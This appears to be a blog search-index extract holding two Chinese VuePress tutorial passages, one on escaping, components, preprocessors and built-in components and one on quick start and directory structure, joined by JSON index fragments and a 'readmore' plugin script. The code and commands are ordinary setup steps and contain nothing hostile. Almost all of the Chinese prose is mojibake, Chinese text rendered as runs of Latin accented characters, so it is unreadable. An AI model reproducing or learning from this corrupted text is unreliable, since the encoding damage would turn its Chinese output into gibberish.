Escapingé»˜è®¤æƒ…å†µä¸‹ï¼Œå—çº§ (block) çš„ä»£ç å—å°†ä¼šè¢«è‡ªåŠ¨åŒ…è£¹åœ¨ v-pre ä¸­ã€‚å¦‚æœä½ æƒ³è¦åœ¨å†…è” (inline) çš„ä»£ç å—æˆ–è€…æ™®é€šæ–‡æœ¬ä¸­æ˜¾ç¤ºåŸå§‹çš„å¤§æ‹¬å·ï¼Œæˆ–è€…ä¸€äº› Vue ç‰¹å®šçš„è¯­æ³•ï¼Œä½ éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰å®¹å™¨ v-pre æ¥åŒ…è£¹ï¼š è¾“å…¥å†…å®¹ 123::: v-pre`{{ This will be displayed as-is }}`::: è¾“å‡ºæ•ˆæœ 1{{ This will be displayed as-is }} ä½¿ç”¨ç»„ä»¶æ­£å¸¸ä½¿ç”¨ç»„ä»¶æ‰€æœ‰åœ¨ .vuepress/components ä¸­æ‰¾åˆ°çš„ *.vue æ–‡ä»¶å°†ä¼šè‡ªåŠ¨åœ°è¢«æ³¨å†Œä¸ºå…¨å±€çš„å¼‚æ­¥ç»„ä»¶ï¼Œå¦‚ï¼š 1234567.â””â”€ .vuepress &nbsp;&nbsp;â””â”€ components â”œâ”€ demo-1.vue &nbsp;&nbsp; &nbsp;â”œâ”€ OtherComponent.vue &nbsp; &nbsp; &nbsp;â””â”€ Foo &nbsp; &nbsp; &nbsp; &nbsp; â””â”€ Bar.vue ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›ç»„ä»¶åœ¨ä»»æ„çš„ Markdown æ–‡ä»¶ä¸­ï¼ˆç»„ä»¶åæ˜¯é€šè¿‡æ–‡ä»¶åå–åˆ°çš„ï¼‰ï¼š 123&lt;demo-1/&gt;&lt;OtherComponent/&gt;&lt;Foo-Bar/&gt; Warning é‡è¦ï¼šè¯·ç¡®ä¿ä¸€ä¸ªè‡ªå®šä¹‰ç»„ä»¶çš„åå­—åŒ…å«è¿æ¥ç¬¦æˆ–è€…æ˜¯ PascalCaseï¼Œå¦åˆ™ï¼Œå®ƒå°†ä¼šè¢«è§†ä¸ºä¸€ä¸ªå†…è”å…ƒç´ ï¼Œå¹¶è¢«åŒ…è£¹åœ¨ä¸€ä¸ª &lt;p&gt; æ ‡ç­¾ä¸­ï¼Œè¿™å°†ä¼šå¯¼è‡´ HTML æ¸²æŸ“ç´Šä¹±ï¼Œå› ä¸º HTML æ ‡å‡†è§„å®šï¼Œ &lt;p&gt; æ ‡ç­¾ä¸­ä¸å…è®¸æ”¾ç½®ä»»ä½•å—çº§å…ƒç´ ã€‚ åœ¨æ ‡é¢˜ä¸­ä½¿ç”¨ç»„ä»¶ä½ å¯ä»¥åœ¨æ ‡é¢˜ä¸­ä½¿ç”¨ Vue ç»„ä»¶ï¼Œä½†æ˜¯è¯·ç•™æ„ä»¥ä¸‹ä¸¤ç§æ–¹å¼çš„ä¸åŒï¼š Markdown è¾“å‡ºçš„ HTML è§£æåçš„æ ‡é¢˜ # text &lt;Tag/&gt; &lt;h1&gt;text &lt;Tag/&gt;&lt;/h1&gt; text # text `&lt;Tag/&gt;` &lt;h1&gt;text &lt;code&gt;&amp;lt;Tag/&amp;gt;&lt;/code&gt;&lt;/h1&gt; text &lt;Tag/&gt; è¢« &lt;code&gt; åŒ…è£…çš„ HTML å°†æŒ‰åŸæ ·æ˜¾ç¤ºï¼Œåªæœ‰æœªè¢«åŒ…è£…çš„ HTML æ‰ä¼šè¢« Vue è§£æã€‚è¾“å‡ºçš„ HTML ç”± markdown-it å®Œæˆï¼Œè€Œè§£æåçš„æ ‡é¢˜ç”± VuePress å®Œæˆï¼Œç”¨äºä¾§è¾¹æ ä»¥åŠæ–‡æ¡£çš„æ ‡é¢˜ã€‚ ä½¿ç”¨é¢„å¤„ç†å™¨VuePress å¯¹ä»¥ä¸‹é¢„å¤„ç†å™¨å·²ç»å†…ç½®ç›¸å…³çš„ Webpack é…ç½®ï¼šsassã€scssã€lessã€stylus å’Œ pugã€‚è¦ä½¿ç”¨å®ƒä»¬ä½ åªéœ€è¦åœ¨é¡¹ç›®ä¸­å®‰è£…å¯¹åº”çš„ä¾èµ–å³å¯ã€‚ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨ sassï¼Œéœ€è¦å®‰è£…ï¼š 1$ yarn add -D sass-loader node-sass ç„¶åä½ å°±å¯ä»¥åœ¨ Markdown æˆ–æ˜¯ç»„ä»¶ä¸­ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š 1234&lt;style lang="sass"&gt; .title font-size: 20px&lt;/style&gt; è¦åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ &lt;template lang="pug"&gt;ï¼Œåˆ™éœ€è¦å®‰è£… pug å’Œ pug-plain-loader: 1$ yarn add -D pug pug-plain-loader éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œå¦‚æœä½ æ˜¯ä¸€ä¸ª stylus ç”¨æˆ·ï¼Œä½ å¹¶ä¸éœ€è¦åœ¨ä½ çš„é¡¹ç›®ä¸­å®‰è£… stylus å’Œ stylus-loaderï¼Œå› ä¸º VuePress å·²ç»å†…ç½®äº†å®ƒä»¬ã€‚å¯¹äºé‚£äº›æ²¡æœ‰å†…ç½®çš„é¢„å¤„ç†å™¨ï¼Œé™¤äº†å®‰è£…å¯¹åº”çš„ä¾èµ–ï¼Œä½ è¿˜éœ€è¦ æ‹“å±•å†…éƒ¨çš„ Webpack é…ç½®ã€‚ è„šæœ¬å’Œæ ·å¼æå‡æœ‰æ—¶ï¼Œä½ å¯ä»¥åªæƒ³åœ¨å½“å‰é¡µé¢åº”ç”¨ä¸€äº› JavaScript æˆ–è€… CSSï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ Markdown æ–‡ä»¶ä¸­ä½¿ç”¨åŸç”Ÿçš„ &lt;script&gt; æˆ–è€… &lt;style&gt; æ ‡ç­¾ï¼Œå®ƒä»¬å°†ä¼šä»ç¼–è¯‘åçš„ HTML æ–‡ä»¶ä¸­æå–å‡ºæ¥ï¼Œå¹¶ä½œä¸ºç”Ÿæˆçš„ Vue å•æ–‡ä»¶ç»„ä»¶çš„ &lt;script&gt; å’Œ &lt;style&gt; æ ‡ç­¾ã€‚ è¾“å…¥å†…å®¹ 1234567891011121314151617&lt;p class="demo" :class="$style.example"&gt;&lt;/p&gt;&lt;style module&gt;.example { color: #41b883;}&lt;/style&gt;&lt;script&gt;export default { props: [\'slot-key\'], mounted () { document.querySelector(`.${this.$style.example}`) .textContent = \'è¿™ä¸ªå—æ˜¯è¢«å†…è”çš„è„šæœ¬æ¸²æŸ“çš„ï¼Œæ ·å¼ä¹Ÿé‡‡ç”¨äº†å†…è”æ ·å¼ã€‚\' }}&lt;/script&gt; è¾“å‡ºæ•ˆæœ å†…ç½®çš„ç»„ä»¶OutboundLinkOutboundLink ç”¨æ¥è¡¨æ˜å½“å‰æ˜¯ä¸€ä¸ªå¤–éƒ¨é“¾æ¥ï¼Œåœ¨ VuePress ä¸­è¿™ä¸ªç»„ä»¶ä¼šç´§è·Ÿåœ¨æ¯ä¸€ä¸ªå¤–éƒ¨é“¾æ¥åé¢ã€‚ ClientOnlyå‚è€ƒ æµè§ˆå™¨çš„ API è®¿é—®é™åˆ¶ã€‚ Content Props: pageKey - string, è¦æ¸²æŸ“çš„ page çš„ hash key, é»˜è®¤å€¼æ˜¯å½“å‰é¡µé¢çš„ key. slotKey - string, é¡µé¢çš„ markdown slot çš„ key. é»˜è®¤å€¼æ˜¯ default slot. Usageï¼š æŒ‡å®šä¸€ä¸ªæŒ‡å®šé¡µé¢çš„ç‰¹å®š slot ç”¨äºæ¸²æŸ“ï¼Œå½“ä½ ä½¿ç”¨ è‡ªå®šä¹‰å¸ƒå±€ æˆ–è€…è‡ªå®šä¹‰ä¸»é¢˜æ—¶ï¼Œè¿™å°†éå¸¸æœ‰ç”¨ã€‚ 1&lt;Content/&gt; å‚è€ƒ: å…¨å±€è®¡ç®—å±æ€§ &gt; $page Markdown æ’æ§½ å¼€å‘ä¸»é¢˜ &gt; è·å–æ¸²æŸ“å†…å®¹ Badge æ³¨æ„ï¼š Badge åªé’ˆå¯¹ VuePress çš„é»˜è®¤ä¸»é¢˜ç”Ÿæ•ˆ Props: text - string type - string, å¯é€‰å€¼ï¼š "tip"|"warning"|"error"ï¼Œé»˜è®¤å€¼æ˜¯ï¼š "tip" vertical - string, å¯é€‰å€¼ï¼š "top"|"middle"ï¼Œé»˜è®¤å€¼æ˜¯ï¼š "top" Usage: ä½ å¯ä»¥åœ¨æ ‡é¢˜ä¸­ï¼Œä½¿ç”¨è¿™ä¸ªç»„ä»¶æ¥ä¸ºæŸäº› API æ·»åŠ ä¸€äº›çŠ¶æ€ã€‚ è¾“å…¥å†…å®¹ 1### Badge &lt;Badge text="beta" type="warning"/&gt; &lt;Badge text="é»˜è®¤ä¸»é¢˜"/&gt; è¾“å…¥æ•ˆæœ å‚è€ƒ: åœ¨æ ‡é¢˜ä¸­ä½¿ç”¨ç»„ä»¶ ä¸‹ç¯‡ - VuePress å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ VuePress å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ä¸»é¢˜ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"VuePress å…¥é—¨æ•™ç¨‹ä¹‹ä¸€å¿«é€Ÿå…¥é—¨ç¯‡",url:"/posts/8d13e75d.html",text:'å‰è¨€VuePress ç«™ç‚¹ VuePress å®˜æ–¹æ–‡æ¡£ VuePress ä¸­æ–‡æ–‡æ¡£ VuePress Github é¡¹ç›® é™æ€ç½‘ç«™ç”Ÿæˆå™¨æ¯”è¾ƒHexo Hexo æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æ¶ã€‚Hexo ä½¿ç”¨ Markdownï¼ˆæˆ–å…¶å®ƒæ¸²æŸ“å¼•æ“ï¼‰è§£ææ–‡ç« ï¼Œåœ¨å‡ ç§’å†…ï¼Œå³å¯åˆ©ç”¨é“ä¸½çš„ä¸»é¢˜ç”Ÿæˆé™æ€ç½‘é¡µã€‚Hexo é…åˆå®ƒçš„ä¸»é¢˜æ¨¡å—ï¼Œæ¯”å¦‚ NexT ä¸»é¢˜ï¼Œå¯ä»¥ä½œä¸ºéå¸¸ç®€æ´æ–¹ä¾¿çš„é™æ€åšå®¢ç³»ç»Ÿã€‚ GitBook GitBook æ˜¯ä¸€ä¸ªç°ä»£çš„æ–‡æ¡£å¹³å°ï¼Œå›¢é˜Ÿæˆ–ä¸ªäººå¯ä»¥åœ¨å…¶ä¸Šç¼–å†™äº§å“ã€API æ¥å£æ–‡æ¡£ä»¥åŠå›¢é˜Ÿå†…éƒ¨çŸ¥è¯†åº“ã€‚GitBook æ”¹ç‰ˆä¹‹åï¼Œæ„Ÿè§‰å›¢é˜Ÿæ›´ä¸“æ³¨äºå•†ä¸šäº§å“è€Œä¸æ˜¯å¼€æºå·¥å…·ï¼ŒåŒæ—¶ CLI å·¥å…·ä¸å†æä¾›äº†ï¼Œæ‰€ä»¥æ— æ³•å®ç°ä¸ªæ€§åŒ–éƒ¨ç½²ã€‚ Nuxt Nuxt.js æ˜¯ä¸€ä¸ªåŸºäº Vue.js çš„é€šç”¨åº”ç”¨æ¡†æ¶ã€‚é€šè¿‡å¯¹å®¢æˆ·ç«¯ / æœåŠ¡ç«¯åŸºç¡€æ¶æ„çš„æŠ½è±¡ç»„ç»‡ï¼ŒNuxt.js ä¸»è¦å…³æ³¨çš„æ˜¯åº”ç”¨çš„ UI æ¸²æŸ“ã€‚Nuxt.js çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªçµæ´»çš„åº”ç”¨æ¡†æ¶ï¼Œä½ å¯ä»¥åŸºäºå®ƒåˆå§‹åŒ–æ–°é¡¹ç›®çš„åŸºç¡€ç»“æ„ä»£ç ï¼Œæˆ–è€…åœ¨å·²æœ‰ Node.js é¡¹ç›®ä¸­ä½¿ç”¨ Nuxt.jsã€‚ç®€è€Œè¨€ä¹‹ï¼ŒNuxt.js æ›´åƒæ˜¯ä¸ºæ„å»ºåº”ç”¨ç¨‹åºè€Œç”Ÿçš„ï¼Œè€Œä¸æ˜¯ç‹¬ç«‹çš„å†…å®¹é™æ€ç½‘ç«™ã€‚ Docsify Docsify æ˜¯ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆæ–‡æ¡£ç½‘ç«™çš„å·¥å…·ã€‚ä¸åŒäº GitBookã€Hexo çš„åœ°æ–¹æ˜¯å®ƒä¸ä¼šç”Ÿæˆå°† .md è½¬æˆ .html æ–‡ä»¶ï¼Œæ‰€æœ‰è½¬æ¢å·¥ä½œéƒ½æ˜¯åœ¨è¿è¡Œæ—¶è¿›ã€‚Docsify æ˜¯åŸºäº Vueï¼Œå®Œå…¨çš„è¿è¡Œæ—¶é©±åŠ¨ï¼Œä¸éœ€è¦æ¸²æŸ“ HTMLï¼Œæ‰€ä»¥å¯¹ SEO ä¸å¤Ÿå‹å¥½ã€‚å¦‚æœä¸å…³æ³¨ SEOï¼Œå®‰è£…ç®€å•åŒ–ä¸æƒ³æœ‰å¤§é‡ä¾èµ–ï¼Œå®ƒæ˜¯æ¯”è¾ƒå¥½çš„é€‰æ‹©ï¼Œæ¯”å¦‚å…¬å¸æˆ–è¿™å›¢é˜Ÿå†…éƒ¨çš„æ–‡æ¡£ç³»ç»Ÿã€‚ Docute Docute æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª JavaScript æ–‡ä»¶ï¼Œå®ƒå¯ä»¥è·å– Markdown æ–‡ä»¶å¹¶å°†å®ƒä»¬å‘ˆç°ä¸ºå•é¡µé¢åº”ç”¨ã€‚å®ƒå®Œå…¨ç”±è¿è¡Œæ—¶é©±åŠ¨ï¼Œå› æ­¤å¹¶ä¸æ¶‰åŠæœåŠ¡ç«¯ç»„ä»¶ï¼Œè¿™å°±æ„å‘³ç€æ²¡æœ‰æ„å»ºè¿‡ç¨‹ã€‚ä½ åªéœ€åˆ›å»ºä¸€ä¸ª HTML æ–‡ä»¶å’Œä¸€å † Markdown æ–‡æ¡£ï¼Œä½ çš„ç½‘ç«™å°±å·®ä¸å¤šå®Œæˆäº†ï¼Docute ä¸ Docsify åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯åœ¨æ–‡ä»¶å¤§å°å’Œ UI åŠä¸åŒçš„ä½¿ç”¨æ–¹å¼ï¼ŒDocute å®˜ç½‘æœ‰å…¶å·®å¼‚çš„ä»‹ç»ã€‚ VuePress VuePress å®é™…ä¸Šæ˜¯ç”± Vueã€Vue Router å’Œ Webpack é©±åŠ¨çš„å•é¡µé¢åº”ç”¨ç¨‹åºï¼Œå®ç°äº† GitBook çš„åŠŸèƒ½ã€‚VuePress å±•ç¤ºé¡µé¢ä¸ Docsify ç±»ä¼¼ï¼Œä½†æ˜¯ä¸ Docsify ä¸åŒçš„æ˜¯ä¼šé¢„å…ˆæ¸²æŸ“ HTMLã€‚æ¯ä¸ª Markdown æ–‡ä»¶éƒ½ä½¿ç”¨ markdown-it ç¼–è¯‘ä¸º HTMLï¼Œç„¶åä½œä¸º Vue ç»„ä»¶çš„æ¨¡æ¿è¿›è¡Œå¤„ç†ï¼›è¿™å…è®¸ä½ ç›´æ¥åœ¨ Markdown æ–‡ä»¶ä¸­ä½¿ç”¨ Vueï¼Œåœ¨éœ€è¦åµŒå…¥åŠ¨æ€å†…å®¹æ—¶ï¼Œè¿™ç§ä½¿ç”¨æ–¹å¼éå¸¸æœ‰ç”¨ã€‚ Other Jekyllã€Typechoã€Hugoã€Ghost VuePress ä»‹ç»VuePress ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªæç®€é™æ€ç½‘ç«™ç”Ÿæˆå™¨ï¼Œå®ƒåŒ…å«ç”± Vue é©±åŠ¨çš„ä¸»é¢˜ç³»ç»Ÿå’Œæ’ä»¶ APIï¼Œå¦ä¸€ä¸ªéƒ¨åˆ†æ˜¯ä¸ºä¹¦å†™æŠ€æœ¯æ–‡æ¡£è€Œä¼˜åŒ–çš„é»˜è®¤ä¸»é¢˜ï¼Œå®ƒçš„è¯ç”Ÿåˆè¡·æ˜¯ä¸ºäº†æ”¯æŒ Vue åŠå…¶å­é¡¹ç›®çš„æ–‡æ¡£éœ€æ±‚ã€‚æ¯ä¸€ä¸ªç”± VuePress ç”Ÿæˆçš„é¡µé¢éƒ½å¸¦æœ‰é¢„æ¸²æŸ“å¥½çš„ HTMLï¼Œä¹Ÿå› æ­¤å…·æœ‰éå¸¸å¥½çš„åŠ è½½æ€§èƒ½å’Œæœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰ã€‚åŒæ—¶ï¼Œä¸€æ—¦é¡µé¢è¢«åŠ è½½ï¼ŒVue å°†æ¥ç®¡è¿™äº›é™æ€å†…å®¹ï¼Œå¹¶å°†å…¶è½¬æ¢æˆä¸€ä¸ªå®Œæ•´çš„å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ï¼Œå…¶ä»–çš„é¡µé¢åˆ™ä¼šåªåœ¨ç”¨æˆ·æµè§ˆåˆ°çš„æ—¶å€™æ‰æŒ‰éœ€åŠ è½½ã€‚ å·¥ä½œåŸç†äº‹å®ä¸Šï¼Œä¸€ä¸ª VuePress ç½‘ç«™æ˜¯ä¸€ä¸ªç”± Vueã€Vue Router å’Œ Webpack é©±åŠ¨çš„å•é¡µåº”ç”¨ã€‚å¦‚æœä½ ä»¥å‰ä½¿ç”¨è¿‡ Vue çš„è¯ï¼Œå½“ä½ åœ¨å¼€å‘ä¸€ä¸ªè‡ªå®šä¹‰ä¸»é¢˜çš„æ—¶å€™ï¼Œä½ ä¼šæ„Ÿå—åˆ°éå¸¸ç†Ÿæ‚‰çš„å¼€å‘ä½“éªŒï¼Œä½ ç”šè‡³å¯ä»¥ä½¿ç”¨ Vue DevTools å»è°ƒè¯•ä½ çš„è‡ªå®šä¹‰ä¸»é¢˜ã€‚åœ¨æ„å»ºæ—¶ï¼Œæˆ‘ä»¬ä¼šä¸ºåº”ç”¨åˆ›å»ºä¸€ä¸ªæœåŠ¡ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰çš„ç‰ˆæœ¬ï¼Œç„¶åé€šè¿‡è™šæ‹Ÿè®¿é—®æ¯ä¸€æ¡è·¯å¾„æ¥æ¸²æŸ“å¯¹åº”çš„ HTMLã€‚è¿™ç§åšæ³•çš„çµæ„Ÿæ¥æºäº Nuxt çš„ nuxt generate å‘½ä»¤ï¼Œä»¥åŠå…¶ä»–çš„ä¸€äº›é¡¹ç›®ï¼Œæ¯”å¦‚ Gatsbyã€‚ åŠŸèƒ½è¯´æ˜å†…ç½®çš„ Markdown æ‹“å±• ç›®å½• è‡ªå®šä¹‰å®¹å™¨ ä»£ç å—ä¸­çš„è¡Œé«˜äº® è¡Œå· å¯¼å…¥ä»£ç æ®µ åœ¨ Markdown ä¸­ ä½¿ç”¨ Vue æ¨¡æ¿è¯­æ³• ä½¿ç”¨ç»„ä»¶ Vue é©±åŠ¨çš„è‡ªå®šä¹‰ä¸»é¢˜ç³»ç»Ÿ ç½‘ç«™å’Œé¡µé¢çš„å…ƒæ•°æ® å†…å®¹æ‘˜æŠ„ é»˜è®¤ä¸»é¢˜ Responsive layout é¦–é¡µ å†…ç½®çš„æœç´¢ Algolia æœç´¢ å¯å®šåˆ¶çš„ navbar and sidebar è‡ªåŠ¨ç”Ÿæˆçš„ GitHub é“¾æ¥å’Œé¡µé¢ç¼–è¾‘é“¾æ¥ PWA: åˆ·æ–°å†…å®¹çš„ Popup æœ€åæ›´æ–°æ—¶é—´ å¤šè¯­è¨€æ”¯æŒ åšå®¢ä¸»é¢˜ æ–‡æ¡£ åœ¨çº¿æ¡ˆä¾‹ Plugin å¼ºå¤§çš„ Plugin API åšå®¢æ’ä»¶ PWA æ’ä»¶ Google Analytics æ’ä»¶ â€¦ VuePress å¿«é€Ÿå…¥é—¨ Warning å‰ææ¡ä»¶ï¼šVuePress éœ€è¦ Node.js &gt;= 8.6 ä¸‹è¿°å†…å®¹ä¼šå¸®åŠ©ä½ ä»å¤´æ­å»ºä¸€ä¸ªç®€å•çš„ VuePress æ–‡æ¡£ï¼Œå¦‚æœä½ æƒ³åœ¨ä¸€ä¸ªç°æœ‰çš„é¡¹ç›®ä¸­ä½¿ç”¨ VuePress æ¥ç®¡ç†æ–‡æ¡£ï¼Œä»æ­¥éª¤ 3 å¼€å§‹ã€‚ åˆ›å»ºå¹¶è¿›å…¥ä¸€ä¸ªæ–°ç›®å½• 1$ mkdir vuepress-starter &amp;&amp; cd vuepress-starter ä½¿ç”¨ä½ å–œæ¬¢çš„åŒ…ç®¡ç†å™¨è¿›è¡Œåˆå§‹åŒ– 1234$ yarn init# æˆ–è€…$ npm init å°† VuePress å®‰è£…ä¸ºæœ¬åœ°ä¾èµ– 1234$ yarn add -D vuepress# æˆ–è€…$ npm install -D vuepress # npm install vuepress --save-dev Warning æ³¨æ„ï¼šå®˜æ–¹å·²ç»ä¸å†æ¨èå…¨å±€å®‰è£… VuePressï¼Œå¦‚æœä½ çš„ç°æœ‰é¡¹ç›®ä¾èµ–äº† Webpack 3.xï¼Œåˆ™æ¨èä½¿ç”¨ Yarn è€Œä¸æ˜¯ NPM æ¥å®‰è£… VuePressã€‚å› ä¸ºåœ¨è¿™ç§æƒ…å½¢ä¸‹ï¼ŒNPM ä¼šç”Ÿæˆé”™è¯¯çš„ä¾èµ–æ ‘ åˆ›å»ºç¬¬ä¸€ç¯‡æ–‡æ¡£ 1$ mkdir docs &amp;&amp; echo \'# Hello VuePress\' &gt; docs/README.md åœ¨ package.json ä¸­æ·»åŠ ä¸€äº› scripts è¿™ä¸€æ­¥éª¤æ˜¯å¯é€‰çš„ï¼Œä½†æ¨èä½ å®Œæˆå®ƒã€‚åœ¨ä¸‹æ–‡ä¸­ï¼Œä¼šé»˜è®¤è¿™äº› scripts å·²ç»è¢«æ·»åŠ ã€‚ 123456{ "scripts": { "docs:dev": "vuepress dev docs", "docs:build": "vuepress build docs" }} åœ¨æœ¬åœ°å¯åŠ¨æœåŠ¡å™¨ 1234$ yarn docs:dev# æˆ–è€…$ npm run docs:dev VuePress ä¼šåœ¨ http://127.0.0.1:8080 å¯åŠ¨ä¸€ä¸ªçƒ­é‡è½½çš„å¼€å‘æœåŠ¡å™¨ï¼Œæ­¤æ—¶ä½ å°±æ‹¥æœ‰äº†ä¸€ä¸ªç®€å•å¯ç”¨çš„ VuePress æ–‡æ¡£ã€‚å½“ä½ çš„æ–‡æ¡£é€æ¸æˆå‹çš„æ—¶å€™ï¼Œä¸è¦å¿˜è®° VuePress çš„ å¤šè¯­è¨€æ”¯æŒ ï¼Œå¹¶äº†è§£ä¸€ä¸‹å¦‚ä½•å°†ä½ çš„æ–‡æ¡£ éƒ¨ç½² åˆ°ä»»æ„é™æ€æ–‡ä»¶æœåŠ¡å™¨ä¸Šã€‚ ç›®å½•ç»“æ„è¯´æ˜ å¦‚æœ docs ç›®å½•åšä¸ºé¡¶çº§ç›®å½•ï¼ˆé vuepress-starter çš„å­ç›®å½•ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456.â”œâ”€ docsâ”‚ â”œâ”€ README.mdâ”‚ â””â”€ .vuepressâ”‚ â””â”€ config.jsâ””â”€ package.json é‚£ä¹ˆ package.json çš„é…ç½®å†…å®¹éœ€è¦æ›´æ”¹ä¸ºï¼š 123456{ "scripts": { "build": "vuepress build .", "dev": "vuepress dev ." }} Shell è„šæœ¬çš„å†…å®¹åˆ™æ›´æ”¹ä¸ºï¼š 1234$ yarn dev# æˆ–è€…$ npm run dev VuePress åŸºç¡€æ¦‚å¿µç›®å½•ç»“æ„VuePress éµå¾ª â€œçº¦å®šä¼˜äºé…ç½®â€ çš„åŸåˆ™ï¼Œæ¨èçš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122.â”œâ”€â”€ docsâ”‚&nbsp;&nbsp; â”œâ”€â”€ .vuepress _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `components` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `theme` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚ â””â”€â”€ Layout.vueâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `public` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `styles` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ index.stylâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ palette.stylâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `templates` _(**å¯é€‰çš„, è°¨æ…é…ç½®**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚ &nbsp; â”œâ”€â”€ dev.htmlâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚ &nbsp; â””â”€â”€ ssr.htmlâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ `config.js` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ `enhanceApp.js` _(**å¯é€‰çš„**)_â”‚&nbsp;&nbsp; â”‚&nbsp;â”‚&nbsp;&nbsp; â”œâ”€â”€ README.mdâ”‚&nbsp;&nbsp; â”œâ”€â”€ guideâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ README.mdâ”‚&nbsp;&nbsp; â””â”€â”€ config.mdâ”‚&nbsp;â””â”€â”€ package.json Warning æ³¨æ„ï¼šè¯·ç•™æ„ç›®å½•åçš„å¤§å†™ docs/.vuepress: ç”¨äºå­˜æ”¾å…¨å±€çš„é…ç½®ã€ç»„ä»¶ã€é™æ€èµ„æºç­‰ã€‚ docs/.vuepress/components: è¯¥ç›®å½•ä¸­çš„ Vue ç»„ä»¶å°†ä¼šè¢«è‡ªåŠ¨æ³¨å†Œä¸ºå…¨å±€ç»„ä»¶ã€‚ docs/.vuepress/theme: ç”¨äºå­˜æ”¾æœ¬åœ°ä¸»é¢˜ã€‚ docs/.vuepress/styles: ç”¨äºå­˜æ”¾æ ·å¼ç›¸å…³çš„æ–‡ä»¶ã€‚ docs/.vuepress/styles/index.styl: å°†ä¼šè¢«è‡ªåŠ¨åº”ç”¨çš„å…¨å±€æ ·å¼æ–‡ä»¶ï¼Œä¼šç”Ÿæˆåœ¨æœ€ç»ˆçš„ CSS æ–‡ä»¶ç»“å°¾ï¼Œå…·æœ‰æ¯”é»˜è®¤æ ·å¼æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚ docs/.vuepress/styles/palette.styl: ç”¨äºé‡å†™é»˜è®¤é¢œè‰²å¸¸é‡ï¼Œæˆ–è€…è®¾ç½®æ–°çš„ stylus é¢œè‰²å¸¸é‡ã€‚ docs/.vuepress/public: é™æ€èµ„æºç›®å½•ã€‚ docs/.vuepress/templates: å­˜å‚¨ HTML æ¨¡æ¿æ–‡ä»¶ã€‚ docs/.vuepress/templates/dev.html: ç”¨äºå¼€å‘ç¯å¢ƒçš„ HTML æ¨¡æ¿æ–‡ä»¶ã€‚ docs/.vuepress/templates/ssr.html: æ„å»ºæ—¶åŸºäº Vue SSR çš„ HTML æ¨¡æ¿æ–‡ä»¶ã€‚ docs/.vuepress/config.js: é…ç½®æ–‡ä»¶çš„å…¥å£æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ YML æˆ– tomlã€‚ docs/.vuepress/enhanceApp.js: å®¢æˆ·ç«¯åº”ç”¨çš„å¢å¼ºã€‚ Warning æ³¨æ„ï¼šå½“ä½ æƒ³è¦å»è‡ªå®šä¹‰ templates/ssr.html æˆ– templates/dev.html æ—¶ï¼Œæœ€å¥½åŸºäº é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶ æ¥ä¿®æ”¹ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´æ„å»ºå‡ºé”™ é¡µé¢è·¯ç”±æ­¤å¤„ä¸€èˆ¬æŠŠ docs ç›®å½•ä½œä¸º targetDir ï¼ˆå‚è€ƒ å‘½ä»¤è¡Œæ¥å£ï¼‰ï¼Œä¸‹é¢æ‰€æœ‰çš„ â€œæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„â€ éƒ½æ˜¯ç›¸å¯¹äº docs 